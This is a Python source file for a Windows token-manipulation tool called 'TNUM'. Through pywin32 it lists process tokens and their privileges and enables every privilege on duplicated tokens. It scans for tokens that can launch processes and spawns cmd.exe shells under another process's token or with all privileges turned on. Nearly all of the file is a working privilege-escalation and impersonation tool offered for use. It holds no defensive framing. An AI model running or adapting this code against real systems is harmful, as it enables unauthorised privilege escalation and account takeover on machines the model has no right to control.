import win32process
import win32api
import win32timezone
import win32con
import win32security
import pywintypes
import win32event
import sys
class token_manipulator:
    token_struc = {
"TokenUser" : 1,
"TokenGroups" : 2,
"TokenPrivileges" : 3,
"TokenOwner" : 4,
"TokenPrimaryGroup" : 5,
"TokenDefaultDacl" : 6,
"TokenSource" : 7,
"TokenType" : 8,
"TokenImpersonationLevel" : 9,
"TokenStatistics" : 10,
"TokenRestrictedSids" : 11,
"TokenSessionId" : 12,
"TokenGroupsAndPrivileges" : 13,
"TokenSessionReference" : 14,
"TokenSandBoxInert" : 15,
"TokenAuditPolicy" : 16,
"TokenOrigin" : 17,
"TokenElevationType" : 18,
"TokenLinkedToken" : 19,
"TokenElevation" : 20,
"TokenHasRestrictions" : 21,
"TokenAccessInformation" : 22,
"TokenVirtualizationAllowed" : 23,
"TokenVirtualizationEnabled" : 24,
"TokenIntegrityLevel" : 25,
"TokenUIAccess" : 26,
"TokenMandatoryPolicy" : 27,
"TokenLogonSid" : 28,
}
    def get_all(token):
        data_dict = {}
        for entry in token_manipulator.token_struc:
            try:
                data_dict.update({entry : win32security.GetTokenInformation(token,token_manipulator.token_struc[entry])})
            except Exception as e:
                pass
        return data_dict
        
    def elevate_token(token):
        # Given a token, it enables all privileges for that token
        supertoken = []
        privs = win32security.GetTokenInformation(token,token_manipulator.token_struc["TokenPrivileges"]) # Gets privileges for the token
        for priv in privs:
            toenable = priv[0]
            supertoken.append((toenable,2)) # Sets the attribute of the privilege LUID to '2' (enabled)
        win32security.AdjustTokenPrivileges(token,False,supertoken) # Adjusts the token privileges
        return token
            
            
    def shell_as(pid):
        try:
            procHandle = win32api.OpenProcess(win32con.MAXIMUM_ALLOWED,pywintypes.FALSE,pid)
        except pywintypes.error as err:
            if "'The parameter is incorrect.'" in str(err):
                print("[-] Process With PID doesn't exist")
                sys.exit(1)
            else:
                print("[?] Unknown Error : ",err)
        print("[+] Getting handle on target process")
        tokenHandle = win32security.OpenProcessToken(procHandle,win32con.MAXIMUM_ALLOWED)
        print("[+] Calling DuplicateTokenEx")
        try:
            token = win32security.DuplicateTokenEx(tokenHandle,3,win32con.MAXIMUM_ALLOWED,win32security.TokenPrimary,win32security.SECURITY_ATTRIBUTES())
        except pywintypes.error as err:
            if "'Access is denied.'" in str(err):
                print("[-] Access is denied")
            else:
                print("[?] Unkown Error : ",err)
            sys.exit(1)
        print("[+] Duplicated Token; Elevating")
        supertoken = token_manipulator.elevate_token(token)
        print("[+] Spawning 'cmd.exe'")
        (hProc,hThread,procId,threadId) = win32process.CreateProcessAsUser(
                        supertoken,
                        None,
                        'cmd.exe',
                        None,
                        None,
                        1,
                        win32process.NORMAL_PRIORITY_CLASS,
                        None,
                        None,
                        win32process.STARTUPINFO()
            )
        win32event.WaitForSingleObject(hProc,win32event.INFINITE) # Waits for the process for an infinite amount of time
    def elevate_privileges():
        print("[+] Getting handle on current process")
        procHandle = win32api.GetCurrentProcess()
        print("[+] Getting handle on token")
        tokenHandle = win32security.OpenProcessToken(procHandle,win32con.MAXIMUM_ALLOWED)
        print("[+] Calling DuplicateTokenEx")
        token = win32security.DuplicateTokenEx(tokenHandle,3,win32con.MAXIMUM_ALLOWED,win32security.TokenPrimary,win32security.SECURITY_ATTRIBUTES())
        print("[+] Duplicated Token; Elevating")
        supertoken = token_manipulator.elevate_token(token)
        print("[+] Spawning 'cmd.exe'")
        (hProc,hThread,procId,threadId) = win32process.CreateProcessAsUser(
                        supertoken, # Primary token
                        None, #App name
                        'cmd.exe', #Executable path
                        None, #Process security
                        None, #Thread security
                        1, #Inherit object handles
                        win32process.NORMAL_PRIORITY_CLASS, #Priority
                        None, # Environment
                        None, #Current directory
                        win32process.STARTUPINFO() #Startup info
            )
        win32event.WaitForSingleObject(hProc,win32event.INFINITE) # Waits for the process for an infinite amount of time
            
            
    def impersonatable():
        # This method gets a list of processes and tries to call DuplicateTokenEx on it's token, creating a new primary token.
        # It will then enable all privileges for that token
        # Then, it will try to spawn the calculator app with the primary token, if this works then it means that the token can be used on a process.
        # Finally, it will close the calculator app.
        
        for pid in win32process.EnumProcesses():
            try:
                procHandle = win32api.OpenProcess(win32con.MAXIMUM_ALLOWED,pywintypes.FALSE,pid) # Opens process with 'MAXIMUM_ALLOWED' privileges
                tokenHandle = win32security.OpenProcessToken(procHandle,win32con.MAXIMUM_ALLOWED) # Opens the process with ADJUST_PRIVILEGES and TOKEN_QUERY rights
                tokenDup = win32security.DuplicateTokenEx(tokenHandle,3,win32con.MAXIMUM_ALLOWED,win32security.TokenPrimary,win32security.SECURITY_ATTRIBUTES())
                tokenSID = win32security.GetTokenInformation(tokenHandle,token_manipulator.token_struc["TokenUser"])[0] # gets token sid
                processName = win32process.GetModuleFileNameEx(procHandle,0) # Gets the main module of the program
                processName = processName.split("\\")[processName.count("\\")] # Gets filename from path
                username = win32security.LookupAccountSid(None,tokenSID)
                standard_username = username[1] + "\\" + username[0] # DOMAIN + USERNAME
                (hProc,hThread,procId,threadId) = win32process.CreateProcessAsUser(
                        tokenDup, # Primary token
                        None,   # AppName
                        'calc.exe', # Executable path
                        None, # Process security 
                        None, # Thread security
                        1, # Inherit Object Handles
                        win32process.NORMAL_PRIORITY_CLASS, # Priority for the process
                        None, # Environment 
                        None, # Current Directory ('None' defaults to current directory)
                        win32process.STARTUPINFO() # Startup info (default)
                )
                win32process.TerminateProcess(hProc,0)
                print(f"[#] We can spawn a process with the token of '{processName}' with PID '{pid}'")
                print(f"[#] Owned by {standard_username}")
            except Exception as e:
                pass


            
    def list(delegate=False,nonprimary=False):
        for pid in win32process.EnumProcesses():
            try:
                procHandle = win32api.OpenProcess(win32con.MAXIMUM_ALLOWED,pywintypes.FALSE,pid) # Opens process with 'MAXIMUM_ALLOWED' privileges
                tokenHandle = win32security.OpenProcessToken(procHandle,win32con.MAXIMUM_ALLOWED) # Opens the process with ADJUST_PRIVILEGES and TOKEN_QUERY rights
                tokenInfo = win32security.GetTokenInformation(tokenHandle,token_manipulator.token_struc["TokenPrivileges"]) # returns a tuple where the 0'th object of each entry is a LUID (locally unique ID) for the privilege
                tokenSID = win32security.GetTokenInformation(tokenHandle,token_manipulator.token_struc["TokenUser"])[0] # gets token sid
                processName = win32process.GetModuleFileNameEx(procHandle,0) # Gets the main module of the program
                processName = processName.split("\\")[processName.count("\\")] # Gets filename from path
                username = win32security.LookupAccountSid(None,tokenSID)
                standard_username = username[1] + "\\" + username[0] # DOMAIN + USERNAME
                logonType = win32security.GetTokenInformation(tokenHandle,token_manipulator.token_struc["TokenType"])
                impersonationLevel = win32security.GetTokenInformation(tokenHandle,token_manipulator.token_struc["TokenStatistics"])["ImpersonationLevel"]
                print_entry = True
                if logonType == 1:
                    logonType = "Primary"
                elif logonType == 2:
                    logonType == "Impersonation"
                if delegate:
                    if impersonationLevel == 0:
                        print_entry = False
                if nonprimary:
                    if logonType == "Primary":
                        print_entry = False
                if print_entry:
                    print(f"[#] We can open '{processName}' with PID '{pid}'")
                    print(f"[#] Owned by {standard_username}")
                    print(f"[#] Token Type : {logonType}")
                    print(f"[#] Impersonation Level : {impersonationLevel}")
                    print(f"[#] '{processName}' Privileges : ")
                
                    for privNumber in tokenInfo:
                        pname = win32security.LookupPrivilegeName(None,privNumber[0])
                        if privNumber[1] == 3:
                            enabled = "Enabled"
                        else:
                            enabled = "Disabled"
                        print(" ----- > " + pname + " : " + enabled)
            except Exception as e:
                pass
    def usage():
        print('''
 _______  __    _  __   __  __   __ 
|       ||  |  | ||  | |  ||  |_|  |
|_     _||   |_| ||  | |  ||       |
  |   |  |       ||  |_|  ||       |
  |   |  |  _    ||       ||       |
  |   |  | | |   ||       || ||_|| |
  |___|  |_|  |__||_______||_|   |_|
                                                                                
        &&&%%%%%%/                                                              
   ,(//(@@@@@@@%%&%%%                                                           
      /@@&////*.,*(&%%%,                                                        
        @@@/,,,...  .*&(###/                                                    
        @@@@@(/,,*#@@%#%%#%##%#%#,                                              
        *@@@@@@@@@@%%%%%%%%%%#%%##%@%/@&/&*                                     
         @@@@##%&&&&%%%%%%%%%%%//#&&@@@&&&(#&&(#%.                              
         (((##%&%&&&&%%%%%%(,,%%%##(#(((/((/#%%&&%%&%&#%%%##(((((/////(((####(  
          /((###&&%%&&&&(**#&&%%%%######%%%%#######&%/*,                        
           .*//(/&@@@@@@&&%%#@@@%%&&%%%%%%%%##(/*.                              
             .//(((/(/((/(/(/((///((///((/*,..                                  
                 ,//////*****/**/**//**,..                                      
                     ,*******,,****,,..                                         
                        .***,,,,,,,*.                                           
                           /#(.,..                                              
                           *,,,#                                                
                         .#  %                                                  
                 ,,*((%#((#((
                 
[TNUM Token Manipulator]
Usage :
    tnum.py OPTIONS


    Basic Options :
    list : Lists processes and their corresponding token information
    elevate : Spawns a CMD prompt with all privileges enabled
    impersonatable : Lists processes whose tokens can be used to spawn a process
    nonprimary : Lists tokens that are not primary tokens (BETA)
    delegate : Lists possible delegate tokens (BETA)
    
    Advanced Options :
    
    Impersonate:
        tnum.py impersonate PID :: Spawns a CMD prompt with a corresponding process PID's primary token

    Attributes:
        tnum.py attributes PID :: Gets all token attributes of a process PID
            ''')
    def main():
        if len(sys.argv) < 2:
            token_manipulator.usage()
        else:
            option = sys.argv[1]
            if option.lower() == 'list':
                token_manipulator.list()
            elif option.lower() == "delegate":
                print("[+] Listing delegate tokens")
                token_manipulator.list(delegate=True)
                print("[+] Done!")
            elif option.lower() == 'nonprimary':
                print("[+] Listing non-primary tokens")
                token_manipulator.list(nonprimary=True)
                print("[+] Done!")
            elif option.lower() == 'elevate':
                token_manipulator.elevate_privileges()
            elif option.lower() == "impersonate":
                if len(sys.argv) < 3:
                    print("[-] Please specify a PID")
                    token_manipulator.usage()
                else:
                    pid = sys.argv[2]
                    try:
                        pid = int(pid)
                        print("[+] Impersonating")
                        token_manipulator.shell_as(pid)
                    except ValueError:
                        print("[-] Please specify an integer for the PID")
                        token_manipulator.usage()
                        sys.exit(0)
            elif option.lower() == 'impersonatable':
                token_manipulator.impersonatable()
                
            elif option.lower() == "attributes":
                if len(sys.argv) < 3:
                    print("[-] Please specify a PID")
                    token_manipulator.usage()
                else:
                    pid = sys.argv[2]
                    try:
                        pid = int(pid)
                        print("[+] Getting Attributes")
                        try:
                            procHandle = win32api.OpenProcess(win32con.MAXIMUM_ALLOWED,pywintypes.FALSE,pid)
                        except pywintypes.error as err:
                            if "'The parameter is incorrect.'" in str(err):
                                print("[-] A program with that PID is not running")
                                sys.exit(1)
                            elif "'Access is denied.'" in str(err):
                                print("[-] Access denied")
                                sys.exit(1)
                        tokenHandle = win32security.OpenProcessToken(procHandle,win32con.MAXIMUM_ALLOWED)
                        data = token_manipulator.get_all(tokenHandle)
                        for entry in data:
                            print(f"[+] {entry} : {data[entry]}")
                    except ValueError:
                        print("[-] Please specify an integer for the PID")
                        token_manipulator.usage()
                        sys.exit(0)
            elif option.lower() == 'impersonatable':
                token_manipulator.impersonatable()
                    
                    
            else:
                token_manipulator.usage()
if __name__ == '__main__':              
    token_manipulator.main()
